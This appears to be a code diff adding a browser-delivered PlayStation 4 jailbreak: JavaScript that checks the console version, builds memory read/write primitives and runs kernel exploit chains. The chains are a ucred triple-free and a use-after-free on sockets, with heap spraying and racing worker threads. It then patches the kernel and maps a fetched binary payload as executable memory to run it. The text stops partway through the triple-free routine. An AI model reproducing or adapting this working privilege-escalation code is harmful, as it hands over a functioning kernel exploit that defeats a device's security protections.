@@ -1,0 +1,3123 @@
+//#region Contants
+const PF_X = 1;
+const PF_W = 2;
+const PF_R = 4;
+
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
+
+const ET_DYN = 3;
+const ET_EXEC = 2;
+
+const MAP_SHARED = 1;
+const MAP_PRIVATE = 2;
+const MAP_FIXED = 0x10;
+const MAP_ANONYMOUS = 0x1000;
+
+const PT_LOAD = 1;
+const SHT_RELA = 4;
+const MADV_DONTNEED = 5;
+const R_X86_64_RELATIVE = 8;
+
+fn.pthread_create = new NativeFunction(webkit_base.add(constants.wk_pthread_create), "number");
+
+fn.munmap = new NativeFunction(0x49, "number");
+fn.mprotect = new NativeFunction(0x4A, "number");
+fn.madvise = new NativeFunction(0x4B, "number");
+fn.mmap = new NativeFunction(0x1DD, "bint");
+fn.jitshm_create = new NativeFunction(0x215, "number");
+fn.mname = new NativeFunction(0x24C, "number");
+fn.kexec = new NativeFunction(0x295, "number");
+//#endregion Constants
+//#region Functions
+function load_bin(data, exit) {
+  const sz = data.length.alignUp(PAGE_SIZE);
+  const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
+  const flags = MAP_PRIVATE | MAP_ANONYMOUS;
+
+  const entry_addr = fn.mmap.invoke(0, sz, prot, flags, -1, 0);
+  logger.debug(`entry_addr: ${entry_addr}`);
+  if (entry_addr.eq(-1)) {
+    throw new SyscallError(`Unable to map memory with size ${sz} !!`);
+  }
+
+  mem.copy(entry_addr, data.buffer.data(), data.length);
+
+  const pthread_addr_addr = mem.alloc(8);
+
+  if (fn.pthread_create.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
+    throw new Error(`Unable to create bin thread !!`);
+  }
+
+  const pthread_addr = arw.view(pthread_addr_addr).getBInt(0, true);
+  const pthread_id = arw.view(pthread_addr).getBInt(0, true);
+
+  logger.info(`Created bin thread with id ${pthread_id} !!`);
+
+  mem.free(pthread_addr_addr);
+
+  if (exit) {
+    fn.kill = new NativeFunction(0x25, "bigint");
+
+    const pid = fn.getpid.invoke();
+
+    fn.kill.invoke(pid, 9);
+  }
+}
+//#endregion
+function load_script(src, remote = true, transfer = []) {
+  return new Promise((resolve, reject) => {
+    const script = document.createElement("script");
+    script.src = src;
+    script.onload = resolve;
+    script.onerror = reject;
+    document.head.appendChild(script);
+  });
+}
+
+async function doJb() {
+  await load_script("src/misc.js");
+
+  try {
+    version.init();
+    switch (version.console) {
+      case 4:
+        await load_script("src/ps4/constants.js");
+        await load_script("src/ps4/userland.js");
+        break;
+      case 5:
+        //TODO
+        break;
+      default:
+        logger.info(`Unsupported console ${version.console}`);
+    }
+
+    logger.info("===USERLAND===");
+
+    let rw = undefined;
+    if (arw.master === undefined) {
+      rw = await init_rw();
+    }
+
+    init_arw(rw);
+    init_rop();
+    init_syscalls();
+
+    logger.info("===END===");
+
+    await load_script("src/loader.js");
+    await load_script("src/workers.js");
+
+    switch (version.console) {
+      case 4:
+        await load_script("src/ps4/kernel.js");
+        break;
+      case 5:
+        //TODO
+        break;
+      default:
+        logger.info(`Unsupported console ${version.console}`);
+    }
+
+    await load_script(`src/${exploitChain}.js`);
+
+    logger.info(`===${exploitChain.toUpperCase()}===`);
+
+    try {
+      if (exploitChain == "lapse") {
+        init();
+        await setup();
+        await double_free_reqs2();
+        leak_kaddrs();
+        double_free_reqs1();
+        make_karw();
+
+        // Increase reference counts for the pipes
+        inc_karw_pipe_refcnt();
+
+        logger.info("Corrupted context cleanup started...");
+
+        // Remove pktinfo pointers
+        remove_pktinfo_from_so(pktopts_twins[0]);
+
+        // Remove rthdr pointers
+        remove_rthdr_from_so(pktopts_twins[1]);
+        remove_rthdr_from_so(rthdr_twins[0]);
+
+        logger.info("Corrupted context cleanup completed !!");
+      } else {
+        init();
+        await setup();
+        await ucred_triple_free();
+        leak_kqueue();
+        await make_karw();
+
+        inc_karw_pipe_refcnt();
+
+        logger.info("Corrupted context cleanup started...");
+
+        // Remove rthdr pointers from triplets
+        for (let i = 0; i < triplets.length; i++) {
+          remove_rthdr_from_so(triplets[i]);
+        }
+
+        // Remove triple freed file from free list
+        remove_uaf_file();
+
+        logger.info("Corrupted context cleanup completed !!");
+      }
+    } finally {
+      cleanup();
+    }
+
+    find_all_proc();
+
+    // Avoid reapplying if already done
+    if (fn.setuid.invoke(0) === -1) {
+      jailbreak();
+
+      const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
+      const kpatches_buf = await kpatches_rsp.arrayBuffer();
+      const kpatches_u8 = new Uint8Array(kpatches_buf);
+
+      kernel_patches(kpatches_u8);
+
+      const bin_rsp = await fetch("src/payload.bin");
+      const bin_buf = await bin_rsp.arrayBuffer();
+      const bin_u8 = new Uint8Array(bin_buf);
+
+      load_bin(bin_u8);
+    }
+
+    logger.info("===END===");
+  } catch (e) {
+    logger.error(e.message);
+    logger.error(e.stack);
+    //mem.free_all();
+  }
+}
+
+//#region Constants
+const logger = {
+  seq: 0,
+  verbose: true, // enable for debug logs
+  info(msg) {
+    this.log(`[+] ${msg}`);
+  },
+  error(msg) {
+    this.log(`[-] ${msg}`);
+  },
+  debug(msg) {
+    if (this.verbose) {
+      this.log(`[*] ${msg}`);
+    }
+  },
+  log(msg) {
+    if (is_worker()) {
+      self.postMessage({ type: "log", value: `[${self.name}]${msg}` });
+    } else {
+      if (this.console === undefined) {
+        this.console = document.getElementById("console");
+      }
+
+      this.console.append(`${msg}\n`);
+      this.console.scrollTop = this.console.scrollHeight;
+
+      const data = JSON.stringify({
+        seq: this.seq++,
+        msg: msg,
+      });
+    }
+  },
+};
+const version = {
+  console: undefined,
+  major: undefined,
+  minor: undefined,
+  init() {
+    const ua = navigator.userAgent;
+
+    logger.info(`Agent: ${ua}`);
+
+    const matches = ua.match(/PlayStation\s+(\d+)[/ ](\d+)\.(\d+)/);
+    if (matches === null) {
+      throw new Error(`${ua} not supported !!`);
+    }
+
+    this.console = parseInt(matches[1], 10);
+    this.major = parseInt(matches[2], 10);
+    this.minor = parseInt(matches[3], 16);
+  },
+  toString() {
+    return `${this.major}.${this.minor.toString(16).padStart(2, "0")}`;
+  },
+};
+//#endregion
+//#region Classes
+class BInt {
+  /** @param  {[number, number]|number|string|BInt|ArrayLike<number>} */
+  constructor() {
+    let lo = 0;
+    let hi = 0;
+
+    switch (arguments.length) {
+      case 0:
+        break;
+      case 1:
+        let value = arguments[0];
+        switch (typeof value) {
+          case "boolean":
+            lo = value ? 1 : 0;
+            break;
+          case "number":
+            if (Number.isNaN(value)) {
+              throw new TypeError(`Number ${value} is NaN`);
+            }
+
+            if (Number.isInteger(value)) {
+              if (!Number.isSafeInteger(value)) {
+                throw new RangeError(`Integer ${value} outside safe 53-bit range`);
+              }
+
+              lo = value >>> 0;
+              hi = Math.floor(value / 0x100000000) >>> 0;
+            } else {
+              BInt.View.setFloat64(0, value, true);
+
+              lo = BInt.View.getUint32(0, true);
+              hi = BInt.View.getUint32(4, true);
+            }
+
+            break;
+          case "string":
+            if (value.startsWith("0x")) {
+              value = value.slice(2);
+            }
+
+            if (value.length > 0x10) {
+              throw new RangeError(`String ${value} is out of range !!`);
+            }
+
+            value = value.padStart(16, "0");
+
+            for (let i = 0; i < 8; i++) {
+              const start = value.length - 2 * (i + 1);
+              const end = value.length - 2 * i;
+              const b = value.slice(start, end);
+              BInt.View.setUint8(i, parseInt(b, 16));
+            }
+
+            lo = BInt.View.getUint32(0, true);
+            hi = BInt.View.getUint32(4, true);
+
+            break;
+          case "object":
+            if (value !== null) {
+              if (Number.isInteger(value.lo) && Number.isInteger(value.hi)) {
+                lo = value.lo;
+                hi = value.hi;
+                break;
+              } else if (ArrayBuffer.isView(value) && value.byteLength === BInt.View.byteLength) {
+                new Uint8Array(BInt.View.buffer).set(new Uint8Array(value.buffer, value.byteOffset, value.byteLength));
+
+                lo = BInt.View.getUint32(0, true);
+                hi = BInt.View.getUint32(4, true);
+                break;
+              }
+            }
+
+          default:
+            throw new TypeError(`Unsupported value ${value} !!`);
+        }
+        break;
+      case 2:
+        hi = arguments[0];
+        lo = arguments[1];
+
+        if (!Number.isInteger(hi)) {
+          throw new RangeError(`hi value ${hi} is not an integer !!`);
+        }
+
+        if (!Number.isInteger(lo)) {
+          throw new RangeError(`lo value ${lo} is not an integer !!`);
+        }
+
+        hi >>>= 0;
+        lo >>>= 0;
+
+        break;
+      default:
+        throw new TypeError("Unsupported input !!");
+    }
+
+    this.lo = lo;
+    this.hi = hi;
+  }
+
+  get i() {
+    const hi = this.hi | 0;
+
+    if (hi < -0x200000 || hi > 0x1fffff) {
+      throw new RangeError(`${this} outside safe 53-bit range`);
+    }
+
+    return hi * 0x100000000 + this.lo;
+  }
+
+  get u() {
+    const hi = this.hi;
+
+    if (hi > 0x1fffff) {
+      throw new RangeError(`${this} outside safe 53-bit range`);
+    }
+
+    return hi * 0x100000000 + this.lo;
+  }
+
+  get d() {
+    const hi_word = this.hi >>> 16;
+    if (hi_word === 0xffff || hi_word === 0xfffe) {
+      throw new RangeError(`${this} cannot be represented as double`);
+    }
+
+    BInt.View.setUint32(0, this.lo, true);
+    BInt.View.setUint32(4, this.hi, true);
+
+    return BInt.View.getFloat64(0, true);
+  }
+
+  toString() {
+    return "0x" + this.hi.toString(16).padStart(8, "0") + this.lo.toString(16).padStart(8, "0");
+  }
+
+  [Symbol.toPrimitive](hint) {
+    if (hint === "string") {
+      return this.toString();
+    }
+
+    return this.i;
+  }
+
+  getBit(idx) {
+    if (idx < 0 || idx > 0x3f) {
+      throw new RangeError(`Bit ${idx} is out of range !!`);
+    }
+
+    return (idx < 0x20 ? this.lo >>> idx : this.hi >>> (idx - 0x20)) & 1;
+  }
+
+  setBit(idx, value) {
+    if (idx < 0 || idx > 0x3f) {
+      throw new RangeError(`Bit ${idx} is out of range !!`);
+    }
+
+    if (idx < 0x20) {
+      this.lo = (value ? this.lo | (1 << idx) : this.lo & ~(1 << idx)) >>> 0;
+    } else {
+      this.hi = (value ? this.hi | (1 << (idx - 0x20)) : this.hi & ~(1 << (idx - 0x20))) >>> 0;
+    }
+  }
+
+  divmod(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    if (value === 0) {
+      throw new Error("Division by zero");
+    }
+
+    let r = new BInt();
+    const q = new BInt();
+    for (let i = 0x3f; i >= 0; i--) {
+      r = r.shl(1);
+
+      if (this.getBit(i)) {
+        r.setBit(0, true);
+      }
+
+      if (r.gte(value)) {
+        r = r.sub(value);
+        q.setBit(i, true);
+      }
+    }
+
+    return { q, r };
+  }
+
+  cmp(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+    return this.hi !== value.hi ? (this.hi > value.hi ? 1 : -1) : this.lo !== value.lo ? (this.lo > value.lo ? 1 : -1) : 0;
+  }
+
+  gt(value) {
+    return this.cmp(value) > 0;
+  }
+
+  gte(value) {
+    return this.cmp(value) >= 0;
+  }
+
+  lt(value) {
+    return this.cmp(value) < 0;
+  }
+
+  lte(value) {
+    return this.cmp(value) <= 0;
+  }
+
+  eq(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+    return this.hi === value.hi && this.lo === value.lo;
+  }
+
+  neq(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+    return this.hi !== value.hi || this.lo !== value.lo;
+  }
+
+  add(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    const lo = this.lo + value.lo;
+    const c = lo > 0xffffffff ? 1 : 0;
+    const hi = this.hi + value.hi + c;
+    if (hi > 0xffffffff) {
+      throw new RangeError("add overflowed !!");
+    }
+
+    return new BInt(hi, lo);
+  }
+
+  sub(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    if (this.lt(value)) {
+      throw new RangeError("sub underflowed !!");
+    }
+
+    const b = this.lo < value.lo ? 1 : 0;
+    const hi = this.hi - value.hi - b;
+    const lo = this.lo - value.lo;
+
+    return new BInt(hi, lo);
+  }
+
+  mul(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    const m00 = Math.imul(this.lo, value.lo);
+    const m01 = Math.imul(this.lo, value.hi);
+    const m10 = Math.imul(this.hi, value.lo);
+    const m11 = Math.imul(this.hi, value.hi);
+
+    const d = m01 + m10;
+    const lo = m00 + (d >>> 0);
+    const c = lo > 0xffffffff ? 1 : 0;
+    const hi = m11 + Math.floor(d / 0x100000000) + c;
+    if (hi > 0xffffffff) {
+      throw new Error("mul overflowed !!");
+    }
+
+    return new BInt(hi, lo);
+  }
+
+  div(value) {
+    return this.divmod(value).q;
+  }
+
+  mod(value) {
+    return this.divmod(value).r;
+  }
+
+  xor(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    const lo = (this.lo ^ value.lo) >>> 0;
+    const hi = (this.hi ^ value.hi) >>> 0;
+
+    return new BInt(hi, lo);
+  }
+
+  and(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    const lo = (this.lo & value.lo) >>> 0;
+    const hi = (this.hi & value.hi) >>> 0;
+
+    return new BInt(hi, lo);
+  }
+
+  or(value) {
+    value = value instanceof BInt ? value : new BInt(value);
+
+    const lo = (this.lo | value.lo) >>> 0;
+    const hi = (this.hi | value.hi) >>> 0;
+
+    return new BInt(hi, lo);
+  }
+
+  not() {
+    const lo = ~this.lo >>> 0;
+    const hi = ~this.hi >>> 0;
+
+    return new BInt(hi, lo);
+  }
+
+  shl(count) {
+    if (count < 0 || count > 0x3f) {
+      throw new RangeError(`Shift ${count} bits out of range !!`);
+    }
+
+    if (count === 0) {
+      return new BInt(this);
+    }
+
+    const lo = count < 0x20 ? (this.lo << count) >>> 0 : 0;
+    const hi = count < 0x20 ? ((this.hi << count) | (this.lo >>> (0x20 - count))) >>> 0 : (this.lo << (count - 0x20)) >>> 0;
+
+    return new BInt(hi, lo);
+  }
+
+  shr(count) {
+    if (count < 0 || count > 63) {
+      throw new RangeError(`Shift ${count} bits out of range !!`);
+    }
+
+    if (count === 0) {
+      return new BInt(this);
+    }
+
+    const lo = count < 0x20 ? ((this.lo >>> count) | (this.hi << (0x20 - count))) >>> 0 : this.hi >>> (count - 0x20);
+    const hi = count < 0x20 ? this.hi >>> count : 0;
+
+    return new BInt(hi, lo);
+  }
+
+  alignUp(alignment) {
+    if (alignment <= 0 || (alignment & (alignment - 1)) !== 0) {
+      throw new RangeError("alignment must be power of 2");
+    }
+
+    const mask = alignment - 1;
+
+    let lo = this.lo + mask;
+    let hi = this.hi;
+
+    if (lo > 0xffffffff) {
+      lo -= 0x100000000;
+      hi++;
+    }
+
+    lo &= ~mask;
+
+    return new BInt(hi, lo);
+  }
+
+  alignDown(alignment) {
+    if (alignment <= 0 || (alignment & (alignment - 1)) !== 0) {
+      throw new RangeError("alignment must be power of 2");
+    }
+
+    const mask = alignment - 1;
+
+    const lo = this.lo & ~mask;
+    const hi = this.hi;
+
+    return new BInt(hi, lo);
+  }
+}
+//#endregion
+//#region Extensions
+Number.prototype.hex = function (padded = false, maxLength = 16) {
+  let str = this.toString(16).toUpperCase();
+
+  if (padded) {
+    str = str.padStart(maxLength, "0");
+  }
+
+  return `0x${str}`;
+};
+
+Number.prototype.alignUp = function (alignment) {
+  const mask = alignment - 1;
+  return (this + mask) & ~mask;
+};
+
+Number.prototype.alignDown = function (alignment) {
+  const mask = alignment - 1;
+  return this & ~mask;
+};
+
+DataView.prototype.getBInt = function (byteOffset, littleEndian = false) {
+  const lo = this.getUint32(byteOffset, littleEndian);
+  const hi = this.getUint32(byteOffset + 4, littleEndian);
+  return new BInt(hi, lo);
+};
+
+DataView.prototype.setBInt = function (byteOffset, value, littleEndian = false) {
+  value = value instanceof BInt ? value : new BInt(value);
+
+  this.setUint32(byteOffset, value.lo, littleEndian);
+  this.setUint32(byteOffset + 4, value.hi, littleEndian);
+};
+//#endregion
+//#region Static
+BInt.View = new DataView(new ArrayBuffer(8));
+//#endregion
+//#region Functions
+function is_worker() {
+  return typeof WorkerGlobalScope !== "undefined" && self instanceof WorkerGlobalScope;
+}
+//#endregion
+
+//#region Variables
+const NUM_ATTEMPT = 8;
+const NUM_IOV_WORKER = 4;
+const NUM_UIO_WORKER = 4;
+const NUM_IPV6_SOCK = 0x100;
+const NUM_ATTEMPT_TWINS = 0x10;
+const NUM_ATTEMPT_TRIPLETS = 0x10;
+const NUM_IOV_SPRAY = 0x100;
+const NUM_UIO_SPRAY = 0x100;
+const NUM_LEAK_KQUEUE = 0x200;
+//#endregion
+//#region Contants
+const NETCONTROL_NETEVENT_SET_QUEUE = 0x20000003;
+const NETCONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
+
+const UIO_READ = 0;
+const UIO_WRITE = 1;
+const UIO_SYSSPACE = 1;
+
+const NUM_UIO_IOV = 0x14;
+const NUM_MSG_IOV = 0x17;
+
+const iov_ss = new Array(2);
+const uio_ss = new Array(2);
+const twins = new Array(2);
+const triplets = new Array(3);
+const ipv6_socks = new Array(NUM_IPV6_SOCK);
+const iov_workers = new Array(NUM_IOV_WORKER);
+const iov_tasks = new Array(NUM_IOV_WORKER);
+const uio_workers = new Array(NUM_UIO_WORKER);
+const uio_tasks = new Array(NUM_UIO_WORKER);
+
+let msg = undefined;
+let msg_iov = undefined;
+let msg_uio = undefined;
+let uio_iov_read = undefined;
+let uio_iov_write = undefined;
+
+let uaf_sock = 0;
+
+let kl_lock = undefined;
+let kq_fdp = undefined;
+
+let tmp = undefined;
+
+fn.netcontrol = new NativeFunction(0x63, "number");
+fn.socketpair = new NativeFunction(0x87, "number");
+fn.sendmsg = new NativeFunction(0x1c, "bint");
+fn.kqueue = new NativeFunction(0x16a, "number");
+//#endregion
+//#region Functions
+function netcontrol_netevent(sock, event) {
+  const size = 8;
+  const addr = mem.alloc(size);
+  arw.view(addr).setInt32(0, sock, true);
+
+  if (fn.netcontrol.invoke(-1, event, addr, size) === -1) {
+    throw new SyscallError(`Unable to queue ${sock} in netevent !!`);
+  }
+}
+
+async function spawn_iov_workers() {
+  logger.debug("Spawn iov workers...");
+
+  for (let i = 0; i < iov_workers.length; i++) {
+    iov_workers[i] = new RPCWorker(`iov_worker_${i}`);
+    await iov_workers[i].init();
+    await iov_workers[i].execute(
+      "register",
+      "kinit",
+      `() => {
+        switch (version.console) {
+          case 4:
+            importScripts("ps4/kernel.js");
+            break;
+          case 5:
+            //TODO
+            break;
+          default:
+            logger.info(\`Unsupported console \${version.console}\`);
+        }
+
+        pin_to_core(MAIN_CORE);
+        set_rtprio(RTP);
+
+        fn.recvmsg = new NativeFunction(0x1B, "bint");
+
+        return true;
+      }`,
+    );
+    await iov_workers[i].execute(
+      "register",
+      "recvmsg",
+      `(iov_ss, msg_addr) => {
+        msg_addr = new BInt(msg_addr);
+
+        fn.recvmsg.invoke(iov_ss[0], msg_addr, 0);
+
+        return true;
+      }`,
+    );
+
+    await iov_workers[i].execute("kinit");
+  }
+
+  logger.debug("iov workers spawned !!");
+}
+
+async function spawn_uio_workers() {
+  logger.debug("Spawn uio workers...");
+
+  for (let i = 0; i < uio_workers.length; i++) {
+    uio_workers[i] = new RPCWorker(`uio_worker_${i}`);
+    await uio_workers[i].init();
+    await uio_workers[i].execute(
+      "register",
+      "kinit",
+      `() => {
+        switch (version.console) {
+          case 4:
+            importScripts("ps4/kernel.js");
+            break;
+          case 5:
+            //TODO
+            break;
+          default:
+            logger.info(\`Unsupported console \${version.console}\`);
+        }
+
+        pin_to_core(MAIN_CORE);
+        set_rtprio(RTP);
+
+        UIO_IOV_NUM = 0x14;
+        fn.readv = new NativeFunction(0x78, "bint");
+        fn.writev = new NativeFunction(0x79, "bint");
+
+        return true;
+      }`,
+    );
+    await uio_workers[i].execute(
+      "register",
+      "uio_read",
+      `(uio_ss, read_addr) => {
+        read_addr = new BInt(read_addr);
+
+        if (fn.writev.invoke(uio_ss[1], read_addr, UIO_IOV_NUM).eq(-1)) {
+          throw new SyscallError(\`Unable to write vector of size \${UIO_IOV_NUM} to fd \${uio_ss[1]} !!\`);
+        }
+
+        return true;
+      }`,
+    );
+    await uio_workers[i].execute(
+      "register",
+      "uio_write",
+      `(uio_ss, write_addr) => {
+        write_addr = new BInt(write_addr);
+
+        if (fn.readv.invoke(uio_ss[0], write_addr, UIO_IOV_NUM).eq(-1)) {
+          throw new SyscallError(\`Unable to read vector of size \${UIO_IOV_NUM} to fd \${uio_ss[0]} !!\`);
+        }
+
+        return true;
+      }`,
+    );
+
+    await uio_workers[i].execute("kinit");
+  }
+
+  logger.debug("uio workers spawned !!");
+}
+
+function stop_iov_workers() {
+  for (const iov_worker of iov_workers) {
+    if (iov_worker === undefined) {
+      continue;
+    }
+
+    logger.debug(`terminate worker ${iov_worker.name}...`);
+
+    iov_worker.terminate();
+
+    logger.debug(`${iov_worker.name} worker terminated !!`);
+  }
+}
+
+function stop_uio_workers() {
+  for (const uio_worker of uio_workers) {
+    if (uio_worker === undefined) {
+      continue;
+    }
+
+    logger.debug(`terminate worker ${uio_worker.name}...`);
+
+    uio_worker.terminate();
+
+    logger.debug(`${uio_worker.name} worker terminated !!`);
+  }
+}
+
+function find_twins() {
+  logger.info("Looking for twins...");
+
+  for (let i = 0; i < NUM_ATTEMPT_TWINS; i++) {
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved
+
+      set_rthdr(ipv6_socks[i]);
+    }
+
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      get_rthdr(ipv6_socks[i], ip6_rthdr0.sizeof);
+
+      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
+      if (idx !== i) {
+        logger.debug(`Found twins after ${i} iterations !!`);
+
+        twins[0] = ipv6_socks[i];
+        twins[1] = ipv6_socks[idx];
+
+        return;
+      }
+    }
+  }
+
+  throw new Error("Unable to find twins !!");
+}
+
+function find_triplet(master, slave) {
+  for (let i = 0; i < NUM_ATTEMPT_TRIPLETS; i++) {
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i] === master || ipv6_socks[i] === slave) {
+        continue;
+      }
+
+      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved
+
+      set_rthdr(ipv6_socks[i]);
+    }
+
+    get_rthdr(master, ip6_rthdr0.sizeof);
+
+    const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
+    if (ipv6_socks[idx] !== master && ipv6_socks[idx] !== slave) {
+      logger.debug(`Found triplet after ${i} iterations !!`);
+      return ipv6_socks[idx];
+    }
+  }
+
+  throw new Error("Unable to find triplet !!");
+}
+
+function init() {
+  logger.info("Environment init started...");
+
+  pin_to_core(MAIN_CORE);
+  set_rtprio(RTP);
+
+  // Prepare spray/leak rthdr0
+  spray_rthdr0_addr = mem.alloc(UCRED_SIZE);
+  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, UCRED_SIZE);
+
+  leak_rthdr0_addr = mem.alloc(UCRED_SIZE);
+
+  // Prepare msg iov
+  const msg_iov_addr = mem.alloc(iovec.sizeof * NUM_MSG_IOV);
+  msg_iov = iovec.new(msg_iov_addr);
+  msg_uio = uio.new(msg_iov_addr);
+
+  msg = msghdr.new();
+
+  msg.msg_iov = msg_iov.addr;
+  msg.msg_iovlen = NUM_MSG_IOV;
+
+  const uio_iov_addr = mem.alloc(iovec.sizeof * NUM_UIO_IOV);
+  uio_iov_read = iovec.new(uio_iov_addr);
+  uio_iov_write = iovec.new(uio_iov_addr);
+
+  const dummy_size = 0x1000;
+  const dummy_addr = mem.alloc(dummy_size);
+
+  mem.bset(dummy_addr, dummy_size, 0x41);
+
+  uio_iov_read.iov_base = dummy_addr;
+  uio_iov_write.iov_base = dummy_addr;
+
+  // Prepare temp buffer
+  tmp = mem.alloc(PAGE_SIZE);
+
+  logger.info("Environment init completed !!");
+}
+
+async function setup() {
+  logger.info("Environment setup started...");
+
+  make_karw_pipe();
+
+  const pair_addr = mem.alloc(8);
+
+  // Create socket pair for iov spraying
+  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
+    throw new SyscallError("Unable to create socket pair !!");
+  }
+
+  iov_ss[0] = arw.view(pair_addr).getInt32(0, true);
+  iov_ss[1] = arw.view(pair_addr).getInt32(4, true);
+
+  // Create socket pair for uio spraying
+  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
+    throw new SyscallError("Unable to create socket pair !!");
+  }
+
+  uio_ss[0] = arw.view(pair_addr).getInt32(0, true);
+  uio_ss[1] = arw.view(pair_addr).getInt32(4, true);
+
+  logger.debug(`iov_ss: ${iov_ss}`);
+  logger.debug(`uio_ss: ${uio_ss}`);
+
+  mem.free(pair_addr);
+
+  // Setup sockets for spraying and initialize pktopts
+  for (let i = 0; i < ipv6_socks.length; i++) {
+    ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
+  }
+
+  await spawn_iov_workers();
+  await spawn_uio_workers();
+
+  logger.info("Environment setup completed !!");
+}
+
+function cleanup() {
+  logger.info("Environment cleanup started...");
+
+  if (uaf_sock !== 0) {
+    if (fn.close.invoke(uaf_sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
+    }
+
+    uaf_sock = 0;
+  }
+
+  for (const sock of iov_ss) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  for (const sock of uio_ss) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  for (const sock of ipv6_socks) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  free_karw_pipe();
+
+  stop_iov_workers();
+  stop_uio_workers();
+
+  if (msg_iov !== undefined) {
+    mem.free(msg_iov.addr);
+  }
+  if (msg_uio !== undefined) {
+    mem.free(msg_uio.addr);
+  }
+  if (msg !== undefined) {
+    mem.free(msg.addr);
+  }
+  if (tmp !== undefined) {
+    mem.free(tmp.addr);
+  }
+
+  mem.free(spray_rthdr0_addr);
+  mem.free(leak_rthdr0_addr);
+
+  logger.info("Environment cleanup completed !!");
+}
+
+async function ucred_triple_free() {
+  logger.info("Ucred double free started...");
+
+  // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt
+  msg_iov.iov_base = 1;
+  msg_iov.iov_len = 1;
+
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
+    try {
+      // Create dummy socket to be registered and then closed
+      const dummy_sock = make_socket(AF_UNIX, SOCK_STREAM);
+      logger.debug(`dummy_sock: ${dummy_sock}`);
+
+      // Register dummy socket
+      netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);
+
+      // Close the dummy socket
+      if (fn.close.invoke(dummy_sock) === -1) {
+        throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
+      }
+
+      // Allocate a new ucred
+      if (fn.setuid.invoke(1) === -1) {
+        throw new SyscallError("Unable to set uid to 1 !!");
+      }
+
+      // Reclaim dummy_sock fd
+      uaf_sock = make_socket(AF_UNIX, SOCK_STREAM);
+      logger.debug(`uaf_sock: ${uaf_sock}`);
+
+      if (uaf_sock !== dummy_sock) {
+        throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
+      }
+
+      // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
+      if (fn.setuid.invoke(1) === -1) {
+        throw new SyscallError("Unable to set uid to 1 !!");
+      }
+
+      // Unregister dummy socket and free the file and ucred
+      netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);
+
+      logger.info(`Attempt to set cr_refcnt back to 1 started...`);
+
+      // Set cr_refcnt back to 1
+      for (let i = 0; i < 0x80; i++) {
+        fn.sendmsg.invoke(0, msg.addr, 0);
+      }
+
+      // Double free ucred.
+      // Note: Only dup works because it does not check fhold
+      let uaf_sock_dup = fn.dup.invoke(uaf_sock);
+      if (uaf_sock_dup === -1) {
+        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
+      }
+
+      if (fn.close.invoke(uaf_sock_dup) === -1) {
+        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
+      }
+
+      // Find twins
+      find_twins();
+
+      logger.info(`Found twins: ${twins} !!`);
+
+      logger.info(`Ucred double free achieved !!`);
+
+      logger.info("Ucred triple free started...");
+
+      logger.info(`Attempt to set cr_refcnt back to 1 started...`);
+
+      // Free one
+      free_rthdr(twins[1]);
+
+      logger.debug("Signaling work to iov workers...");
+
+      let reclaimed = false;
+
+      // Set cr_refcnt back to 1
+      for (let i = 0; i < NUM_IOV_SPRAY; i++) {
+        // Reclaim with iov
+        for (let i = 0; i < iov_tasks.length; i++) {
+          iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
+        }
+
+        if (fn.sched_yield.invoke() === -1) {
+          throw new SyscallError("Unable to yield scheduler !!");
+        }
+
+        get_rthdr(twins[0], ip6_rthdr0.sizeof);
+
+        const cr_refcnt = arw.view(leak_rthdr0_addr).getInt32(0, true);
+        if (cr_refcnt === 1) {
+          logger.debug(`Set cr_refcnt back to 1 after ${i} iterations !!`);
+          reclaimed = true;
+          break;
+        }
+
+        // Release iov spray
+        if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+          throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+        }
+
+        await Promise.all(iov_tasks);
+
